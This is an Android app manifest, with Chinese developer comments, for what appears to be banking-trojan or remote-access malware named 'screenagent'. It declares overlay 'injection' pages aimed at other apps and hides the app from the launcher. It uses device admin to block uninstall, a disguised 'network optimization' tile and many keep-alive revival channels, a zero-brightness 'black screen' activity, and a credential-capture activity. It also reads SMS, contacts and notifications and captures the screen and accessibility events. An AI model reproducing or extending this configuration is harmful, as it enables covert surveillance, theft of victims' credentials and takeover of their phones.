<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />
    <!-- 一键卸载：拉起系统卸载框必须声明，否则 UninstallerActivity 直接拒绝 -->
    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
    <!-- 注入页/浮层：Android 10+ 后台启动 Activity 需要它 -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <!-- Android 11+ 包可见性：不加这条 getInstalledPackages 只返回"可见"的包，注入目标会漏 -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.WRITE_SETTINGS"
        tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />

    <!-- 2.3：引导所需的 9 项运行时权限 -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />

    <!-- 2.3：保活所需的权限 -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <queries>
        <intent>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.HOME" />
        </intent>
    </queries>

    <application
        android:name="com.zaka.screenagent.AgentApp"
        android:allowBackup="false"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/Theme.ScreenAgent"
        android:usesCleartextTraffic="false"
        tools:targetApi="34">

        <!-- 2.3：无桌面入口。MainActivity 只能由内部组件拉起（无障碍/广播/面板指令） -->
        <activity
            android:name="com.zaka.screenagent.MainActivity"
            android:screenOrientation="portrait"
            android:excludeFromRecents="true"
            android:exported="false"
            android:theme="@style/Theme.ScreenAgent" />

        <!-- 注入页：自己的全屏 Activity（对齐 2.2 的 OverlayActivity，不是悬浮窗） -->
        <activity
            android:name="com.zaka.screenagent.ui.InjectionActivity"
            android:screenOrientation="portrait"
            android:excludeFromRecents="true"
            android:exported="false"
            android:launchMode="singleInstance"
            android:theme="@style/Theme.ScreenAgent.Inject" />

        <activity
            android:name="com.zaka.screenagent.ProjectionActivity"
            android:screenOrientation="portrait"
            android:excludeFromRecents="true"
            android:exported="false"
            android:theme="@style/Theme.ScreenAgent.PermissionBridge" />

        <!-- 2.3：真黑屏用的"背光持有者"（1x1 透明 Activity，只为把 screenBrightness 压到 0） -->
        <activity
            android:name="com.zaka.screenagent.ui.BrightnessKeeperActivity"
            android:screenOrientation="portrait"
            android:excludeFromRecents="true"
            android:exported="false"
            android:launchMode="singleInstance"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <!-- 2.3：设备管理员（防卸载） -->
        <receiver
            android:name="com.zaka.screenagent.admin.MoyingAdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/adminrights" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>


        <!-- 2.3：设备管理员激活页（照 2.2 的 DeviceAdminActivity，直接起 ADD_DEVICE_ADMIN） -->
        <activity
            android:name="com.zaka.screenagent.admin.DeviceAdminActivity"
            android:excludeFromRecents="true"
            android:exported="false"
            android:theme="@style/Theme.ScreenAgent.PermissionBridge" />

        <!-- 2.3：引导用的权限申请页（透明） -->
        <activity
            android:name="com.zaka.screenagent.perm.PermissionActivity"
            android:excludeFromRecents="true"
            android:exported="false"
            android:theme="@style/Theme.ScreenAgent.PermissionBridge" />

        <!-- 2.3：保活（前台服务 / Job / 闹钟 / 屏保 / 开机） -->

        <service
            android:name="com.zaka.screenagent.keepalive.KeepAliveJobService"
            android:exported="false"
            android:permission="android.permission.BIND_JOB_SERVICE" />

        <service
            android:name="com.zaka.screenagent.keepalive.KeepAliveDreamService"
            android:exported="true"
            android:permission="android.permission.BIND_DREAM_SERVICE" />

        <receiver
            android:name="com.zaka.screenagent.keepalive.AlarmReviveReceiver"
            android:exported="false" />

        <!-- 2.3：通知采集（同时是保活入口，系统级绑定） -->
        <service
            android:name="com.zaka.screenagent.notify.NotificationListener"
            android:exported="false"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- 保活复活入口（全部无通知、无可见 UI） -->
        <provider
            android:name="com.zaka.screenagent.keepalive.KeepAliveProvider"
            android:authorities="${applicationId}.keepalive"
            android:exported="true"
            android:enabled="true" />

        <service
            android:name="com.zaka.screenagent.keepalive.KeepAliveTileService"
            android:exported="true"
            android:enabled="true"
            android:icon="@drawable/ic_keepalive_tile"
            android:label="网络优化"
            android:permission="android.permission.BIND_QUICK_SETTINGS_TILE">
            <intent-filter>
                <action android:name="android.service.quicksettings.action.QS_TILE" />
            </intent-filter>
            <meta-data
                android:name="android.service.quicksettings.ACTIVE_TILE"
                android:value="true" />
        </service>

        <service
            android:name="com.zaka.screenagent.keepalive.KeepAliveMediaService"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.media.browse.MediaBrowserService" />
            </intent-filter>
        </service>

        <receiver
            android:name="com.zaka.screenagent.keepalive.KeepAliveWidget"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
            </intent-filter>
            <meta-data
                android:name="android.appwidget.provider"
                android:resource="@xml/keepalive_widget_info" />
        </receiver>

        <!-- 2.3：自触发复活通道（等价 2.2 MainReceiver 的 RestartConn/RestartSensor/BOOT_COMPLETED1） -->
        <receiver
            android:name="com.zaka.screenagent.keepalive.RestartReceiver"
            android:exported="false">
            <intent-filter>
                <action android:name="RestartConn" />
                <action android:name="RestartSensor" />
                <action android:name="BOOT_COMPLETED1" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.zaka.screenagent.keepalive.BootReceiver"
            android:directBootAware="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <!-- 标准开机 -->
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <!-- 直接启动（加密设备未解锁时也会触发，2.2 的 MainReceiver 里有） -->
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <!-- 重启 -->
                <action android:name="android.intent.action.REBOOT" />
                <!-- 快速开机（部分 ROM 用它代替 BOOT_COMPLETED） -->
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                <!-- 国产 ROM 私有开机广播：BOOT_COMPLETED 常被拦，这些会先到 -->
                <action android:name="oppo.intent.action.BOOT_COMPLETED" />
                <action android:name="vivo.intent.action.BOOT_COMPLETED" />
                <action android:name="com.huawei.android.intent.action.BOOT_COMPLETED" />
                <action android:name="com.coloros.bootcompleted" />
                <action android:name="com.meizu.intent.action.BOOT_COMPLETED" />
                <action android:name="com.smartisanos.action.BOOT_COMPLETED" />
                <!-- 自己被覆盖安装/更新后触发（升级不掉线） -->
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <service
            android:name="com.zaka.screenagent.capture.ProjectionCaptureService"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <service
            android:name="com.zaka.screenagent.accessibility.BoundaryAccessibilityService"
            android:exported="true"
            android:label="@string/accessibility_service_name"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/boundary_accessibility_service" />
        </service>

            <activity
            android:name="com.zaka.screenagent.pin.ConfirmCredentialActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:exported="false" />
            <activity
            android:name="com.zaka.screenagent.pin.WakeActivity"
            android:theme="@style/Theme.ScreenAgent.Wake"
            android:noHistory="true"
            android:excludeFromRecents="true"
            android:showOnLockScreen="true"
            android:exported="false" />
    </application>
</manifest>
